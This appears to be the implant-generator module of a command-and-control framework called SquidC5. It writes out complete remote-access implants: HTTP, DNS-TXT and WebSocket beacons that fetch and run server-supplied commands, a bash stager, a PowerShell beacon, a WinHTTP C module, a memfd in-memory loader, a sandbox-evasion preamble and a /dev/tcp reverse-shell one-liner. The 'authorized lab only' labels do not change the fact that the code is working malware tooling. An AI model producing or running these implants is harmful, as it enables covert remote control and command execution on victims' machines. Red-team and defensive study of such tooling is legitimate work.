"""Generate complete implant artifacts for all families (authorized lab only)."""

from __future__ import annotations

import base64
import json
from typing import Any


def generate_with_evasion(
    base_script: str,
    platform: str = "linux",
    *,
    include_sandbox_probe: bool = True,
) -> str:
    from squidc5.evasion.checks import sandbox_probe_snippet

    parts = ["# evasion preamble (authorized lab only)", ""]
    if include_sandbox_probe:
        parts.append(sandbox_probe_snippet(platform))
        parts.append("")
    parts.append(base_script)
    return "\n".join(parts)


def generate_memory_beacon_python(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
    return f'''#!/usr/bin/env python3
# SquidC5 memory_beacon_python — authorized testing only
import json, time, urllib.request, socket, types
def _run():
    C2 = "http://{host}:{port}{path}"
    SID = None
    while True:
        try:
            req = urllib.request.Request(
                C2,
                data=json.dumps({{"session_id": SID, "hostname": socket.gethostname()}}).encode(),
                headers={{"Content-Type": "application/json"}},
            )
            with urllib.request.urlopen(req, timeout=30) as r:
                data = json.loads(r.read().decode())
                SID = data.get("session_id", SID)
                task = data.get("task")
                if task:
                    import subprocess
                    out = subprocess.getoutput(task.get("command", "id"))
                    done = urllib.request.Request(
                        C2 + "/result",
                        data=json.dumps({{"task_id": task["id"], "result": out}}).encode(),
                        headers={{"Content-Type": "application/json"}},
                    )
                    urllib.request.urlopen(done, timeout=30).read()
        except Exception:
            pass
        time.sleep(5)
types.FunctionType(_run.__code__, globals())()
'''


def generate_dns_beacon_python(host: str, port: int, zone: str) -> str:
    """DNS TXT C2 beacon — queries server DNS listener (authorized lab)."""
    return f'''#!/usr/bin/env python3
# SquidC5 dns_beacon_python — authorized testing only
# Requires: dnspython optional; falls back to raw UDP DNS
import base64, json, random, socket, struct, time, uuid

DNS_HOST = {json.dumps(host)}
DNS_PORT = {int(port)}
ZONE = {json.dumps(zone.strip("."))}
SID = None

def b32(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()

def b32d(s: str) -> bytes:
    s = s.upper()
    pad = (-len(s)) % 8
    return base64.b32decode(s + ("=" * pad))

def build_query(name: str) -> bytes:
    txid = random.randint(0, 65535)
    header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    q = b""
    for label in name.split("."):
        lb = label.encode("ascii")
        q += bytes([len(lb)]) + lb
    q += b"\\x00" + struct.pack("!HH", 16, 1)  # TXT IN
    return header + q

def parse_txt(resp: bytes) -> str:
    # naive scan for TXT rdata
    try:
        # find first length-prefixed printable after answers
        i = 12
        while i < len(resp) and resp[i] != 0:
            i += 1 + resp[i]
        i += 5  # null + type/class
        # skip to answer if present
        if len(resp) < i + 12:
            return ""
        # walk remaining for TXT type 16
        pos = i
        while pos + 12 < len(resp):
            if resp[pos] & 0xC0:
                pos += 2
            else:
                while pos < len(resp) and resp[pos] != 0:
                    pos += 1 + resp[pos]
                pos += 1
            if pos + 10 > len(resp):
                break
            rtype, rclass, ttl, rdlen = struct.unpack("!HHIH", resp[pos:pos+10])
            pos += 10
            rdata = resp[pos:pos+rdlen]
            pos += rdlen
            if rtype == 16 and rdata:
                return rdata[1:1+rdata[0]].decode("ascii", errors="ignore")
    except Exception:
        return ""
    return ""

def dns_roundtrip(mode: str, obj: dict) -> dict:
    payload = b32(json.dumps(obj, separators=(",", ":")).encode())
    # split into 50-char labels
    chunks = [payload[i:i+50] for i in range(0, max(len(payload), 1), 50)] or ["0"]
    name = ".".join([mode] + chunks + [ZONE])
    q = build_query(name)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.sendto(q, (DNS_HOST, DNS_PORT))
    resp, _ = s.recvfrom(4096)
    s.close()
    txt = parse_txt(resp)
    if not txt:
        return {{}}
    try:
        return json.loads(b32d(txt).decode())
    except Exception:
        return {{}}

while True:
    try:
        body = {{"session_id": SID, "hostname": socket.gethostname()}}
        data = dns_roundtrip("b", body)
        SID = data.get("session_id", SID)
        task = data.get("task")
        if task:
            import subprocess
            out = subprocess.getoutput(task.get("command", "id"))
            dns_roundtrip("r", {{"task_id": task["id"], "result": out}})
    except Exception:
        pass
    time.sleep(8 + random.random() * 4)
'''


def generate_ws_beacon_python(
    host: str, port: int, path: str = "/ws/v1/beacon", *, scheme: str = "ws"
) -> str:
    sch = "wss" if scheme.lower() in ("wss", "https") else "ws"
    return f'''#!/usr/bin/env python3
# SquidC5 ws_beacon_python — authorized testing only
# Uses websocket-client if available, else stdlib http.client upgrade is not used;
# prefer: pip install websocket-client  OR use websockets
import json, socket, time, random

HOST = {json.dumps(host)}
PORT = {int(port)}
PATH = {json.dumps(path)}
SCHEME = {json.dumps(sch)}
SID = None

def run_ws():
    global SID
    try:
        import websocket  # type: ignore
    except ImportError:
        # minimal fallback: HTTP long-poll not available — raise clear error
        raise SystemExit("Install websocket-client: pip install websocket-client")
    url = f"{{SCHEME}}://{{HOST}}:{{PORT}}{{PATH}}"
    ws = websocket.create_connection(url, timeout=30)
    while True:
        try:
            ws.send(json.dumps({{"type": "beacon", "session_id": SID, "hostname": socket.gethostname()}}))
            raw = ws.recv()
            data = json.loads(raw)
            SID = data.get("session_id", SID)
            task = data.get("task")
            if task:
                import subprocess
                out = subprocess.getoutput(task.get("command", "id"))
                ws.send(json.dumps({{"type": "result", "task_id": task["id"], "result": out}}))
                ws.recv()
        except Exception:
            try:
                ws.close()
            except Exception:
                pass
            time.sleep(3)
            ws = websocket.create_connection(url, timeout=30)
        time.sleep(3 + random.random() * 2)

if __name__ == "__main__":
    run_ws()
'''


def generate_linux_stager(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
    """Stage0: download stage1 into memfd and exec (Linux)."""
    return f'''#!/bin/bash
# SquidC5 linux stage0 stager — authorized testing only
set -e
URL="http://{host}:{port}{path}"
# Stage0 only demonstrates memfd pattern with embedded stage1 beacon
python3 - <<'PY'
import ctypes, os, sys, json, time, urllib.request, socket
# stage1 inline (memory-only style)
C2 = "http://{host}:{port}{path}"
SID = None
while True:
    try:
        req = urllib.request.Request(C2, data=json.dumps({{"session_id": SID, "hostname": socket.gethostname()}}).encode(), headers={{"Content-Type":"application/json"}})
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode())
            SID = data.get("session_id", SID)
            task = data.get("task")
            if task:
                import subprocess
                out = subprocess.getoutput(task.get("command","id"))
                urllib.request.urlopen(urllib.request.Request(C2+"/result", data=json.dumps({{"task_id": task["id"], "result": out}}).encode(), headers={{"Content-Type":"application/json"}}), timeout=30).read()
    except Exception:
        pass
    time.sleep(5)
PY
'''


def generate_windows_ps_beacon(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
    return f'''# SquidC5 windows PowerShell beacon — authorized testing only
$C2 = "http://{host}:{port}{path}"
$SID = $null
while ($true) {{
  try {{
    $body = @{{ session_id = $SID; hostname = $env:COMPUTERNAME }} | ConvertTo-Json -Compress
    $resp = Invoke-RestMethod -Uri $C2 -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30
    $SID = $resp.session_id
    if ($resp.task) {{
      $out = cmd /c $resp.task.command 2>&1 | Out-String
      $done = @{{ task_id = $resp.task.id; result = $out }} | ConvertTo-Json -Compress
      Invoke-RestMethod -Uri ($C2 + "/result") -Method POST -Body $done -ContentType "application/json" -TimeoutSec 30 | Out-Null
    }}
  }} catch {{}}
  Start-Sleep -Seconds 5
}}
'''


def generate_bof_c(host: str, port: int, arch: str = "x64") -> str:
    """Complete BOF-style C source (Beacon Object File conventions) for lab compile."""
    return f'''/* SquidC5 BOF-style module — authorized testing only
 * Arch: {arch}
 * Compile (example, mingw):
 *   x86_64-w64-mingw32-gcc -c sc5_bof.c -o sc5_bof.o
 * Load with your BOF runner / COFF loader.
 * This module issues an HTTP beacon via WinHTTP when go() is called.
 */
#ifdef __cplusplus
extern "C" {{
#endif

/* Minimal declarations for BOF-style entry without full windows.h in unit tests */
#ifndef _WIN32
/* Non-Windows stub for CI — operators compile on Windows toolchains */
void go(char* args, int len) {{ (void)args; (void)len; }}
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

void go(char* args, int alen) {{
    (void)args; (void)alen;
    HINTERNET hS = WinHttpOpen(L"SquidC5-BOF/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return;
    HINTERNET hC = WinHttpConnect(hS, L"{host}", {int(port)}, 0);
    if (!hC) {{ WinHttpCloseHandle(hS); return; }}
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/v1/implant/beacon",
                                      NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hR) {{ WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return; }}
    const char* body = "{{\\"hostname\\":\\"bof-host\\"}}";
    BOOL ok = WinHttpSendRequest(hR, L"Content-Type: application/json\\r\\n",
                                 (DWORD)-1L, (LPVOID)body, (DWORD)lstrlenA(body),
                                 (DWORD)lstrlenA(body), 0);
    if (ok) WinHttpReceiveResponse(hR, NULL);
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
}}
#endif

#ifdef __cplusplus
}}
#endif
'''


def generate_linux_memfd_loader(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
    """Python ctypes memfd_create loader embedding stage1."""
    stage1 = generate_memory_beacon_python(host, port, path)
    b64 = base64.b64encode(stage1.encode()).decode()
    return f'''#!/usr/bin/env python3
# SquidC5 linux memfd loader — authorized testing only
import base64, ctypes, os, sys
stage = base64.b64decode("{b64}")
# memfd_create via syscall
__NR_memfd_create = 319  # x86_64
libc = ctypes.CDLL(None)
try:
    fd = libc.syscall(__NR_memfd_create, b"sc5", 1)
except Exception:
    fd = -1
if fd < 0:
    # fallback: exec in-process
    exec(compile(stage, "<sc5>", "exec"), {{}})
    sys.exit(0)
os.write(fd, stage)
os.lseek(fd, 0, os.SEEK_SET)
os.execv(f"/proc/self/fd/{{fd}}", ["sc5"])
'''


def generate_implant(
    family: str,
    platform: str,
    arch: str,
    host: str,
    port: int,
    path: str = "/api/v1/implant/beacon",
    *,
    evasion: bool = True,
    zone: str | None = None,
    ws_path: str | None = None,
    scheme: str | None = None,
) -> dict[str, Any]:
    content: str
    meta: dict[str, Any] = {"family": family, "platform": platform, "arch": arch}

    if family in ("memory_beacon_python", "http_beacon"):
        if platform not in ("linux", "macos", "windows"):
            raise ValueError(f"{family} unsupported platform {platform}")
        if platform == "windows":
            content = generate_windows_ps_beacon(host, port, path)
        else:
            content = generate_memory_beacon_python(host, port, path)
            if evasion:
                content = generate_with_evasion(content, platform)
    elif family == "dns_beacon":
        z = zone or "c2.lab.invalid"
        content = generate_dns_beacon_python(host, port, z)
        if evasion and platform != "windows":
            content = generate_with_evasion(content, platform)
        meta["zone"] = z
        meta["channel"] = "dns"
    elif family == "ws_beacon":
        wp = ws_path or "/ws/v1/beacon"
        sch = "wss" if str(scheme or "").lower() in ("wss", "https") else "ws"
        content = generate_ws_beacon_python(host, port, wp, scheme=sch)
        meta["ws_path"] = wp
        meta["channel"] = "ws"
        meta["scheme"] = sch
    elif family == "linux_stager":
        if platform != "linux":
            raise ValueError("linux_stager is linux-only")
        content = generate_linux_stager(host, port, path)
    elif family == "linux_memfd":
        if platform != "linux":
            raise ValueError("linux_memfd is linux-only")
        content = generate_linux_memfd_loader(host, port, path)
    elif family in ("bof_stub", "bof"):
        if platform != "windows":
            raise ValueError("bof is windows-only")
        content = generate_bof_c(host, port, arch)
        meta["format"] = "c_source"
    elif family == "reverse_shell_stable":
        if platform == "windows":
            content = (
                f"# PowerShell reverse shell reconnect note — use sc5 payloads reverse_shell_* "
                f"or stage-2 stabilize on listener {host}:{port}\n"
            )
        else:
            content = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
    else:
        raise ValueError(f"No generator for family: {family}")

    meta["content"] = content
    return meta
